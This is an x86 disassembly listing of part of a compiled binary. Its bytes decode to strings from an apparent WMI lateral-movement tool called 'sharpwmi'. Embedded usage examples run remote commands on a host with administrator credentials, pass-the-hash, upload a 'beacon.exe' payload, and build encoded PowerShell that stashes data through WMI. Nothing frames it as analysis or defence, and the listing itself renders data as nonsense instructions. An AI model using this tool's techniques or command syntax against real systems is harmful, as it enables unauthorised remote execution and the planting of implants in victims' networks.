  402bfb:	74 50                	je     0x402c4d
  402bfd:	61                   	popa
  402bfe:	74 68                	je     0x402c68
  402c00:	00 73 68             	add    %dh,0x68(%ebx)
  402c03:	61                   	popa
  402c04:	72 70                	jb     0x402c76
  402c06:	77 6d                	ja     0x402c75
  402c08:	69 00 49 6d 70 65    	imul   $0x65706d49,(%eax),%eax
  402c0e:	72 73                	jb     0x402c83
  402c10:	6f                   	outsl  %ds:(%esi),(%dx)
  402c11:	6e                   	outsb  %ds:(%esi),(%dx)
  402c12:	61                   	popa
  402c13:	74 69                	je     0x402c7e
  402c15:	6f                   	outsl  %ds:(%esi),(%dx)
  402c16:	6e                   	outsb  %ds:(%esi),(%dx)
  402c17:	4c                   	dec    %esp
  402c18:	65 76 65             	gs jbe 0x402c80
  402c1b:	6c                   	insb   (%dx),%es:(%edi)
  402c1c:	00 67 65             	add    %ah,0x65(%edi)
  402c1f:	74 5f                	je     0x402c80
  402c21:	49                   	dec    %ecx
  402c22:	74 65                	je     0x402c89
  402c24:	6d                   	insl   (%dx),%es:(%edi)
  402c25:	00 73 65             	add    %dh,0x65(%ebx)
  402c28:	74 5f                	je     0x402c89
  402c2a:	49                   	dec    %ecx
  402c2b:	74 65                	je     0x402c92
  402c2d:	6d                   	insl   (%dx),%es:(%edi)
  402c2e:	00 53 79             	add    %dl,0x79(%ebx)
  402c31:	73 74                	jae    0x402ca7
  402c33:	65 6d                	gs insl (%dx),%es:(%edi)
  402c35:	00 4d 61             	add    %cl,0x61(%ebp)
  402c38:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  402c3f:	49                   	dec    %ecx
  402c40:	6d                   	insl   (%dx),%es:(%edi)
  402c41:	70 65                	jo     0x402ca8
  402c43:	72 73                	jb     0x402cb8
  402c45:	6f                   	outsl  %ds:(%esi),(%dx)
  402c46:	6e                   	outsb  %ds:(%esi),(%dx)
  402c47:	61                   	popa
  402c48:	74 69                	je     0x402cb3
  402c4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4b:	6e                   	outsb  %ds:(%esi),(%dx)
  402c4c:	00 53 79             	add    %dl,0x79(%ebx)
  402c4f:	73 74                	jae    0x402cc5
  402c51:	65 6d                	gs insl (%dx),%es:(%edi)
  402c53:	2e 52                	cs push %edx
  402c55:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402c58:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402c5d:	6e                   	outsb  %ds:(%esi),(%dx)
  402c5e:	00 72 75             	add    %dh,0x75(%edx)
  402c61:	6e                   	outsb  %ds:(%esi),(%dx)
  402c62:	00 53 6c             	add    %dl,0x6c(%ebx)
  402c65:	65 65 70 00          	gs gs jo 0x402c69
  402c69:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  402c6e:	00 53 79             	add    %dl,0x79(%ebx)
  402c71:	73 74                	jae    0x402ce7
  402c73:	65 6d                	gs insl (%dx),%es:(%edi)
  402c75:	2e 44                	cs inc %esp
  402c77:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402c7e:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  402c85:	74 65                	je     0x402cec
  402c87:	6d                   	insl   (%dx),%es:(%edi)
  402c88:	2e 52                	cs push %edx
  402c8a:	75 6e                	jne    0x402cfa
  402c8c:	74 69                	je     0x402cf7
  402c8e:	6d                   	insl   (%dx),%es:(%edi)
  402c8f:	65 2e 49             	gs cs dec %ecx
  402c92:	6e                   	outsb  %ds:(%esi),(%dx)
  402c93:	74 65                	je     0x402cfa
  402c95:	72 6f                	jb     0x402d06
  402c97:	70 53                	jo     0x402cec
  402c99:	65 72 76             	gs jb  0x402d12
  402c9c:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  402ca3:	73 74                	jae    0x402d19
  402ca5:	65 6d                	gs insl (%dx),%es:(%edi)
  402ca7:	2e 52                	cs push %edx
  402ca9:	75 6e                	jne    0x402d19
  402cab:	74 69                	je     0x402d16
  402cad:	6d                   	insl   (%dx),%es:(%edi)
  402cae:	65 2e 43             	gs cs inc %ebx
  402cb1:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb2:	6d                   	insl   (%dx),%es:(%edi)
  402cb3:	70 69                	jo     0x402d1e
  402cb5:	6c                   	insb   (%dx),%es:(%edi)
  402cb6:	65 72 53             	gs jb  0x402d0c
  402cb9:	65 72 76             	gs jb  0x402d32
  402cbc:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  402cc3:	62 75 67             	bound  %esi,0x67(%ebp)
  402cc6:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  402ccd:	65 
  402cce:	73 00                	jae    0x402cd0
  402cd0:	73 65                	jae    0x402d37
  402cd2:	74 5f                	je     0x402d33
  402cd4:	45                   	inc    %ebp
  402cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  402cd6:	61                   	popa
  402cd7:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  402cdb:	72 69                	jb     0x402d46
  402cdd:	76 69                	jbe    0x402d48
  402cdf:	6c                   	insb   (%dx),%es:(%edi)
  402ce0:	65 67 65 73 00       	gs addr16 gs jae 0x402ce5
  402ce5:	52                   	push   %edx
  402ce6:	65 61                	gs popa
  402ce8:	64 41                	fs inc %ecx
  402cea:	6c                   	insb   (%dx),%es:(%edi)
  402ceb:	6c                   	insb   (%dx),%es:(%edi)
  402cec:	42                   	inc    %edx
  402ced:	79 74                	jns    0x402d63
  402cef:	65 73 00             	gs jae 0x402cf2
  402cf2:	47                   	inc    %edi
  402cf3:	65 74 42             	gs je  0x402d38
  402cf6:	79 74                	jns    0x402d6c
  402cf8:	65 73 00             	gs jae 0x402cfb
  402cfb:	61                   	popa
  402cfc:	72 67                	jb     0x402d65
  402cfe:	73 00                	jae    0x402d00
  402d00:	67 65 74 5f          	addr16 gs je 0x402d63
  402d04:	4f                   	dec    %edi
  402d05:	70 74                	jo     0x402d7b
  402d07:	69 6f 6e 73 00 49 6e 	imul   $0x6e490073,0x6e(%edi),%ebp
  402d0e:	76 6f                	jbe    0x402d7f
  402d10:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  402d14:	74 68                	je     0x402d7e
  402d16:	6f                   	outsl  %ds:(%esi),(%dx)
  402d17:	64 4f                	fs dec %edi
  402d19:	70 74                	jo     0x402d8f
  402d1b:	69 6f 6e 73 00 43 6f 	imul   $0x6f430073,0x6e(%edi),%ebp
  402d22:	6e                   	outsb  %ds:(%esi),(%dx)
  402d23:	6e                   	outsb  %ds:(%esi),(%dx)
  402d24:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402d29:	6e                   	outsb  %ds:(%esi),(%dx)
  402d2a:	4f                   	dec    %edi
  402d2b:	70 74                	jo     0x402da1
  402d2d:	69 6f 6e 73 00 4f 62 	imul   $0x624f0073,0x6e(%edi),%ebp
  402d34:	6a 65                	push   $0x65
  402d36:	63 74 47 65          	arpl   %esi,0x65(%edi,%eax,2)
  402d3a:	74 4f                	je     0x402d8b
  402d3c:	70 74                	jo     0x402db2
  402d3e:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  402d45:	74 4d                	je     0x402d94
  402d47:	65 74 68             	gs je  0x402db2
  402d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d4b:	64 50                	fs push %eax
  402d4d:	61                   	popa
  402d4e:	72 61                	jb     0x402db1
  402d50:	6d                   	insl   (%dx),%es:(%edi)
  402d51:	65 74 65             	gs je  0x402db9
  402d54:	72 73                	jb     0x402dc9
  402d56:	00 4d 61             	add    %cl,0x61(%ebp)
  402d59:	6e                   	outsb  %ds:(%esi),(%dx)
  402d5a:	61                   	popa
  402d5b:	67 65 6d             	gs insl (%dx),%es:(%di)
  402d5e:	65 6e                	outsb  %gs:(%esi),(%dx)
  402d60:	74 43                	je     0x402da5
  402d62:	6c                   	insb   (%dx),%es:(%edi)
  402d63:	61                   	popa
  402d64:	73 73                	jae    0x402dd9
  402d66:	00 43 6f             	add    %al,0x6f(%ebx)
  402d69:	6e                   	outsb  %ds:(%esi),(%dx)
  402d6a:	63 61 74             	arpl   %esp,0x74(%ecx)
  402d6d:	00 46 6f             	add    %al,0x6f(%esi)
  402d70:	72 6d                	jb     0x402ddf
  402d72:	61                   	popa
  402d73:	74 00                	je     0x402d75
  402d75:	4d                   	dec    %ebp
  402d76:	61                   	popa
  402d77:	6e                   	outsb  %ds:(%esi),(%dx)
  402d78:	61                   	popa
  402d79:	67 65 6d             	gs insl (%dx),%es:(%di)
  402d7c:	65 6e                	outsb  %gs:(%esi),(%dx)
  402d7e:	74 42                	je     0x402dc2
  402d80:	61                   	popa
  402d81:	73 65                	jae    0x402de8
  402d83:	4f                   	dec    %edi
  402d84:	62 6a 65             	bound  %ebp,0x65(%edx)
  402d87:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  402d8b:	61                   	popa
  402d8c:	6e                   	outsb  %ds:(%esi),(%dx)
  402d8d:	61                   	popa
  402d8e:	67 65 6d             	gs insl (%dx),%es:(%di)
  402d91:	65 6e                	outsb  %gs:(%esi),(%dx)
  402d93:	74 4f                	je     0x402de4
  402d95:	62 6a 65             	bound  %ebp,0x65(%edx)
  402d98:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  402d9c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d9d:	6e                   	outsb  %ds:(%esi),(%dx)
  402d9e:	6e                   	outsb  %ds:(%esi),(%dx)
  402d9f:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  402da4:	79 73                	jns    0x402e19
  402da6:	74 65                	je     0x402e0d
  402da8:	6d                   	insl   (%dx),%es:(%edi)
  402da9:	2e 4d                	cs dec %ebp
  402dab:	61                   	popa
  402dac:	6e                   	outsb  %ds:(%esi),(%dx)
  402dad:	61                   	popa
  402dae:	67 65 6d             	gs insl (%dx),%es:(%di)
  402db1:	65 6e                	outsb  %gs:(%esi),(%dx)
  402db3:	74 00                	je     0x402db5
  402db5:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  402db8:	74 65                	je     0x402e1f
  402dba:	6e                   	outsb  %ds:(%esi),(%dx)
  402dbb:	74 00                	je     0x402dbd
  402dbd:	43                   	inc    %ebx
  402dbe:	6f                   	outsl  %ds:(%esi),(%dx)
  402dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  402dc0:	76 65                	jbe    0x402e27
  402dc2:	72 74                	jb     0x402e38
  402dc4:	00 53 79             	add    %dl,0x79(%ebx)
  402dc7:	73 74                	jae    0x402e3d
  402dc9:	65 6d                	gs insl (%dx),%es:(%edi)
  402dcb:	2e 54                	cs push %esp
  402dcd:	65 78 74             	gs js  0x402e44
  402dd0:	00 6f 70             	add    %ch,0x70(%edi)
  402dd3:	5f                   	pop    %edi
  402dd4:	45                   	inc    %ebp
  402dd5:	71 75                	jno    0x402e4c
  402dd7:	61                   	popa
  402dd8:	6c                   	insb   (%dx),%es:(%edi)
  402dd9:	69 74 79 00 00 00 00 	imul   $0x0,0x0(%ecx,%edi,2),%esi
  402de0:	00 
  402de1:	1b 57 00             	sbb    0x0(%edi),%edx
  402de4:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  402dea:	32 00                	xor    (%eax),%al
  402dec:	5f                   	pop    %edi
  402ded:	00 50 00             	add    %dl,0x0(%eax)
  402df0:	72 00                	jb     0x402df2
  402df2:	6f                   	outsl  %ds:(%esi),(%dx)
  402df3:	00 63 00             	add    %ah,0x0(%ebx)
  402df6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  402dfa:	73 00                	jae    0x402dfc
  402dfc:	00 0d 43 00 72 00    	add    %cl,0x720043
  402e02:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  402e06:	74 00                	je     0x402e08
  402e08:	65 00 00             	add    %al,%gs:(%eax)
  402e0b:	17                   	pop    %ss
  402e0c:	43                   	inc    %ebx
  402e0d:	00 6f 00             	add    %ch,0x0(%edi)
  402e10:	6d                   	insl   (%dx),%es:(%edi)
  402e11:	00 6d 00             	add    %ch,0x0(%ebp)
  402e14:	61                   	popa
  402e15:	00 6e 00             	add    %ch,0x0(%esi)
  402e18:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  402e1d:	00 6e 00             	add    %ch,0x0(%esi)
  402e20:	65 00 00             	add    %al,%gs:(%eax)
  402e23:	81 dd 0a 00 09 00    	sbb    $0x9000a,%ebp
  402e29:	09 00                	or     %eax,(%eax)
  402e2b:	73 00                	jae    0x402e2d
  402e2d:	68 00 61 00 72       	push   $0x72006100
  402e32:	00 70 00             	add    %dh,0x0(%eax)
  402e35:	77 00                	ja     0x402e37
  402e37:	6d                   	insl   (%dx),%es:(%edi)
  402e38:	00 69 00             	add    %ch,0x0(%ecx)
  402e3b:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402e3f:	78 00                	js     0x402e41
  402e41:	65 00 20             	add    %ah,%gs:(%eax)
  402e44:	00 31                	add    %dh,(%ecx)
  402e46:	00 39                	add    %bh,(%ecx)
  402e48:	00 32                	add    %dh,(%edx)
  402e4a:	00 2e                	add    %ch,(%esi)
  402e4c:	00 31                	add    %dh,(%ecx)
  402e4e:	00 36                	add    %dh,(%esi)
  402e50:	00 38                	add    %bh,(%eax)
  402e52:	00 2e                	add    %ch,(%esi)
  402e54:	00 32                	add    %dh,(%edx)
  402e56:	00 2e                	add    %ch,(%esi)
  402e58:	00 33                	add    %dh,(%ebx)
  402e5a:	00 20                	add    %ah,(%eax)
  402e5c:	00 61 00             	add    %ah,0x0(%ecx)
  402e5f:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  402e63:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  402e69:	73 00                	jae    0x402e6b
  402e6b:	74 00                	je     0x402e6d
  402e6d:	72 00                	jb     0x402e6f
  402e6f:	61                   	popa
  402e70:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  402e74:	00 72 00             	add    %dh,0x0(%edx)
  402e77:	20 00                	and    %al,(%eax)
  402e79:	31 00                	xor    %eax,(%eax)
  402e7b:	32 00                	xor    (%eax),%al
  402e7d:	33 00                	xor    (%eax),%eax
  402e7f:	20 00                	and    %al,(%eax)
  402e81:	63 00                	arpl   %eax,(%eax)
  402e83:	6d                   	insl   (%dx),%es:(%edi)
  402e84:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  402e88:	00 77 00             	add    %dh,0x0(%edi)
  402e8b:	68 00 6f 00 61       	push   $0x61006f00
  402e90:	00 6d 00             	add    %ch,0x0(%ebp)
  402e93:	69 00 0a 00 09 00    	imul   $0x9000a,(%eax),%eax
  402e99:	09 00                	or     %eax,(%eax)
  402e9b:	73 00                	jae    0x402e9d
  402e9d:	68 00 61 00 72       	push   $0x72006100
  402ea2:	00 70 00             	add    %dh,0x0(%eax)
  402ea5:	77 00                	ja     0x402ea7
  402ea7:	6d                   	insl   (%dx),%es:(%edi)
  402ea8:	00 69 00             	add    %ch,0x0(%ecx)
  402eab:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402eaf:	78 00                	js     0x402eb1
  402eb1:	65 00 20             	add    %ah,%gs:(%eax)
  402eb4:	00 31                	add    %dh,(%ecx)
  402eb6:	00 39                	add    %bh,(%ecx)
  402eb8:	00 32                	add    %dh,(%edx)
  402eba:	00 2e                	add    %ch,(%esi)
  402ebc:	00 31                	add    %dh,(%ecx)
  402ebe:	00 36                	add    %dh,(%esi)
  402ec0:	00 38                	add    %bh,(%eax)
  402ec2:	00 2e                	add    %ch,(%esi)
  402ec4:	00 32                	add    %dh,(%edx)
  402ec6:	00 2e                	add    %ch,(%esi)
  402ec8:	00 33                	add    %dh,(%ebx)
  402eca:	00 20                	add    %ah,(%eax)
  402ecc:	00 61 00             	add    %ah,0x0(%ecx)
  402ecf:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  402ed3:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  402ed9:	73 00                	jae    0x402edb
  402edb:	74 00                	je     0x402edd
  402edd:	72 00                	jb     0x402edf
  402edf:	61                   	popa
  402ee0:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  402ee4:	00 72 00             	add    %dh,0x0(%edx)
  402ee7:	20 00                	and    %al,(%eax)
  402ee9:	31 00                	xor    %eax,(%eax)
  402eeb:	32 00                	xor    (%eax),%al
  402eed:	33 00                	xor    (%eax),%eax
  402eef:	20 00                	and    %al,(%eax)
  402ef1:	75 00                	jne    0x402ef3
  402ef3:	70 00                	jo     0x402ef5
  402ef5:	6c                   	insb   (%dx),%es:(%edi)
  402ef6:	00 6f 00             	add    %ch,0x0(%edi)
  402ef9:	61                   	popa
  402efa:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  402efe:	00 62 00             	add    %ah,0x0(%edx)
  402f01:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  402f05:	63 00                	arpl   %eax,(%eax)
  402f07:	6f                   	outsl  %ds:(%esi),(%dx)
  402f08:	00 6e 00             	add    %ch,0x0(%esi)
  402f0b:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402f0f:	78 00                	js     0x402f11
  402f11:	65 00 20             	add    %ah,%gs:(%eax)
  402f14:	00 63 00             	add    %ah,0x0(%ebx)
  402f17:	3a 00                	cmp    (%eax),%al
  402f19:	5c                   	pop    %esp
  402f1a:	00 62 00             	add    %ah,0x0(%edx)
  402f1d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  402f21:	63 00                	arpl   %eax,(%eax)
  402f23:	6f                   	outsl  %ds:(%esi),(%dx)
  402f24:	00 6e 00             	add    %ch,0x0(%esi)
  402f27:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402f2b:	78 00                	js     0x402f2d
  402f2d:	65 00 0a             	add    %cl,%gs:(%edx)
  402f30:	00 09                	add    %cl,(%ecx)
  402f32:	00 09                	add    %cl,(%ecx)
  402f34:	00 73 00             	add    %dh,0x0(%ebx)
  402f37:	68 00 61 00 72       	push   $0x72006100
  402f3c:	00 70 00             	add    %dh,0x0(%eax)
  402f3f:	77 00                	ja     0x402f41
  402f41:	6d                   	insl   (%dx),%es:(%edi)
  402f42:	00 69 00             	add    %ch,0x0(%ecx)
  402f45:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402f49:	78 00                	js     0x402f4b
  402f4b:	65 00 20             	add    %ah,%gs:(%eax)
  402f4e:	00 70 00             	add    %dh,0x0(%eax)
  402f51:	74 00                	je     0x402f53
  402f53:	68 00 20 00 31       	push   $0x31002000
  402f58:	00 39                	add    %bh,(%ecx)
  402f5a:	00 32                	add    %dh,(%edx)
  402f5c:	00 2e                	add    %ch,(%esi)
  402f5e:	00 31                	add    %dh,(%ecx)
  402f60:	00 36                	add    %dh,(%esi)
  402f62:	00 38                	add    %bh,(%eax)
  402f64:	00 2e                	add    %ch,(%esi)
  402f66:	00 32                	add    %dh,(%edx)
  402f68:	00 2e                	add    %ch,(%esi)
  402f6a:	00 33                	add    %dh,(%ebx)
  402f6c:	00 20                	add    %ah,(%eax)
  402f6e:	00 63 00             	add    %ah,0x0(%ebx)
  402f71:	6d                   	insl   (%dx),%es:(%edi)
  402f72:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  402f76:	00 77 00             	add    %dh,0x0(%edi)
  402f79:	68 00 6f 00 61       	push   $0x61006f00
  402f7e:	00 6d 00             	add    %ch,0x0(%ebp)
  402f81:	69 00 0a 00 09 00    	imul   $0x9000a,(%eax),%eax
  402f87:	09 00                	or     %eax,(%eax)
  402f89:	73 00                	jae    0x402f8b
  402f8b:	68 00 61 00 72       	push   $0x72006100
  402f90:	00 70 00             	add    %dh,0x0(%eax)
  402f93:	77 00                	ja     0x402f95
  402f95:	6d                   	insl   (%dx),%es:(%edi)
  402f96:	00 69 00             	add    %ch,0x0(%ecx)
  402f99:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402f9d:	78 00                	js     0x402f9f
  402f9f:	65 00 20             	add    %ah,%gs:(%eax)
  402fa2:	00 70 00             	add    %dh,0x0(%eax)
  402fa5:	74 00                	je     0x402fa7
  402fa7:	68 00 20 00 31       	push   $0x31002000
  402fac:	00 39                	add    %bh,(%ecx)
  402fae:	00 32                	add    %dh,(%edx)
  402fb0:	00 2e                	add    %ch,(%esi)
  402fb2:	00 31                	add    %dh,(%ecx)
  402fb4:	00 36                	add    %dh,(%esi)
  402fb6:	00 38                	add    %bh,(%eax)
  402fb8:	00 2e                	add    %ch,(%esi)
  402fba:	00 32                	add    %dh,(%edx)
  402fbc:	00 2e                	add    %ch,(%esi)
  402fbe:	00 33                	add    %dh,(%ebx)
  402fc0:	00 20                	add    %ah,(%eax)
  402fc2:	00 75 00             	add    %dh,0x0(%ebp)
  402fc5:	70 00                	jo     0x402fc7
  402fc7:	6c                   	insb   (%dx),%es:(%edi)
  402fc8:	00 6f 00             	add    %ch,0x0(%edi)
  402fcb:	61                   	popa
  402fcc:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  402fd0:	00 62 00             	add    %ah,0x0(%edx)
  402fd3:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  402fd7:	63 00                	arpl   %eax,(%eax)
  402fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fda:	00 6e 00             	add    %ch,0x0(%esi)
  402fdd:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402fe1:	78 00                	js     0x402fe3
  402fe3:	65 00 20             	add    %ah,%gs:(%eax)
  402fe6:	00 63 00             	add    %ah,0x0(%ebx)
  402fe9:	3a 00                	cmp    (%eax),%al
  402feb:	5c                   	pop    %esp
  402fec:	00 62 00             	add    %ah,0x0(%edx)
  402fef:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  402ff3:	63 00                	arpl   %eax,(%eax)
  402ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ff6:	00 6e 00             	add    %ch,0x0(%esi)
  402ff9:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  402ffd:	78 00                	js     0x402fff
  402fff:	65 00 00             	add    %al,%gs:(%eax)
  403002:	07                   	pop    %es
  403003:	70 00                	jo     0x403005
  403005:	74 00                	je     0x403007
  403007:	68 00 00 01 00       	push   $0x10000
  40300c:	07                   	pop    %es
  40300d:	63 00                	arpl   %eax,(%eax)
  40300f:	6d                   	insl   (%dx),%es:(%edi)
  403010:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  403014:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  403019:	00 17                	add    %dl,(%edi)
  40301b:	5c                   	pop    %esp
  40301c:	00 72 00             	add    %dh,0x0(%edx)
  40301f:	6f                   	outsl  %ds:(%esi),(%dx)
  403020:	00 6f 00             	add    %ch,0x0(%edi)
  403023:	74 00                	je     0x403025
  403025:	5c                   	pop    %esp
  403026:	00 63 00             	add    %ah,0x0(%ebx)
  403029:	69 00 6d 00 76 00    	imul   $0x76006d,(%eax),%eax
  40302f:	32 00                	xor    (%eax),%al
  403031:	00 21                	add    %ah,(%ecx)
  403033:	70 00                	jo     0x403035
  403035:	6f                   	outsl  %ds:(%esi),(%dx)
  403036:	00 77 00             	add    %dh,0x0(%edi)
  403039:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40303d:	73 00                	jae    0x40303f
  40303f:	68 00 65 00 6c       	push   $0x6c006500
  403044:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  403048:	00 2d 00 65 00 6e    	add    %ch,0x6e006500
  40304e:	00 63 00             	add    %ah,0x0(%ebx)
  403051:	20 00                	and    %al,(%eax)
  403053:	01 09                	add    %ecx,(%ecx)
  403055:	24 00                	and    $0x0,%al
  403057:	61                   	popa
  403058:	00 3d 00 28 00 00    	add    %bh,0x2800
  40305e:	81 b9 29 00 3b 00 24 	cmpl   $0x620024,0x3b0029(%ecx)
  403065:	00 62 00 
  403068:	3d 00 5b 00 43       	cmp    $0x43005b00,%eax
  40306d:	00 6f 00             	add    %ch,0x0(%edi)
  403070:	6e                   	outsb  %ds:(%esi),(%dx)
  403071:	00 76 00             	add    %dh,0x0(%esi)
  403074:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403078:	74 00                	je     0x40307a
  40307a:	5d                   	pop    %ebp
  40307b:	00 3a                	add    %bh,(%edx)
  40307d:	00 3a                	add    %bh,(%edx)
  40307f:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  403083:	00 42 00             	add    %al,0x0(%edx)
  403086:	61                   	popa
  403087:	00 73 00             	add    %dh,0x0(%ebx)
  40308a:	65 00 36             	add    %dh,%gs:(%esi)
  40308d:	00 34 00             	add    %dh,(%eax,%eax,1)
  403090:	53                   	push   %ebx
  403091:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  403095:	00 69 00             	add    %ch,0x0(%ecx)
  403098:	6e                   	outsb  %ds:(%esi),(%dx)
  403099:	00 67 00             	add    %ah,0x0(%edi)
  40309c:	28 00                	sub    %al,(%eax)
  40309e:	5b                   	pop    %ebx
  40309f:	00 53 00             	add    %dl,0x0(%ebx)
  4030a2:	79 00                	jns    0x4030a4
  4030a4:	73 00                	jae    0x4030a6
  4030a6:	74 00                	je     0x4030a8
  4030a8:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4030ac:	2e 00 54 00 65       	add    %dl,%cs:0x65(%eax,%eax,1)
  4030b1:	00 78 00             	add    %bh,0x0(%eax)
  4030b4:	74 00                	je     0x4030b6
  4030b6:	2e 00 55 00          	add    %dl,%cs:0x0(%ebp)
  4030ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4030bb:	00 69 00             	add    %ch,0x0(%ecx)
  4030be:	63 00                	arpl   %eax,(%eax)
  4030c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4030c5:	00 45 00             	add    %al,0x0(%ebp)
  4030c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4030c9:	00 63 00             	add    %ah,0x0(%ebx)
  4030cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cd:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4030d1:	00 6e 00             	add    %ch,0x0(%esi)
  4030d4:	67 00 5d 00          	add    %bl,0x0(%di)
  4030d8:	3a 00                	cmp    (%eax),%al
  4030da:	3a 00                	cmp    (%eax),%al
  4030dc:	55                   	push   %ebp
  4030dd:	00 6e 00             	add    %ch,0x0(%esi)
  4030e0:	69 00 63 00 6f 00    	imul   $0x6f0063,(%eax),%eax
  4030e6:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4030ea:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  4030ee:	65 00 74 00 42       	add    %dh,%gs:0x42(%eax,%eax,1)
  4030f3:	00 79 00             	add    %bh,0x0(%ecx)
  4030f6:	74 00                	je     0x4030f8
  4030f8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4030fc:	28 00                	sub    %al,(%eax)
  4030fe:	24 00                	and    $0x0,%al
  403100:	61                   	popa
  403101:	00 29                	add    %ch,(%ecx)
  403103:	00 29                	add    %ch,(%ecx)
  403105:	00 3b                	add    %bh,(%ebx)
  403107:	00 24 00             	add    %ah,(%eax,%eax,1)
  40310a:	72 00                	jb     0x40310c
  40310c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  403110:	20 00                	and    %al,(%eax)
  403112:	3d 00 20 00 47       	cmp    $0x47002000,%eax
  403117:	00 65 00             	add    %ah,0x0(%ebp)
  40311a:	74 00                	je     0x40311c
  40311c:	2d 00 57 00 6d       	sub    $0x6d005700,%eax
  403121:	00 69 00             	add    %ch,0x0(%ecx)
  403124:	4f                   	dec    %edi
  403125:	00 62 00             	add    %ah,0x0(%edx)
  403128:	6a 00                	push   $0x0
  40312a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40312e:	74 00                	je     0x403130
  403130:	20 00                	and    %al,(%eax)
  403132:	2d 00 4c 00 69       	sub    $0x69004c00,%eax
  403137:	00 73 00             	add    %dh,0x0(%ebx)
  40313a:	74 00                	je     0x40313c
  40313c:	20 00                	and    %al,(%eax)
  40313e:	2d 00 4e 00 61       	sub    $0x61004e00,%eax
  403143:	00 6d 00             	add    %ch,0x0(%ebp)
  403146:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40314a:	70 00                	jo     0x40314c
  40314c:	61                   	popa
  40314d:	00 63 00             	add    %ah,0x0(%ebx)
  403150:	65 00 20             	add    %ah,%gs:(%eax)
  403153:	00 72 00             	add    %dh,0x0(%edx)
  403156:	6f                   	outsl  %ds:(%esi),(%dx)
  403157:	00 6f 00             	add    %ch,0x0(%edi)
  40315a:	74 00                	je     0x40315c
  40315c:	5c                   	pop    %esp
  40315d:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  403161:	00 66 00             	add    %ah,0x0(%esi)
  403164:	61                   	popa
  403165:	00 75 00             	add    %dh,0x0(%ebp)
  403168:	6c                   	insb   (%dx),%es:(%edi)
  403169:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40316d:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  403171:	00 57 00             	add    %dl,0x0(%edi)
  403174:	68 00 65 00 72       	push   $0x72006500
  403179:	00 65 00             	add    %ah,0x0(%ebp)
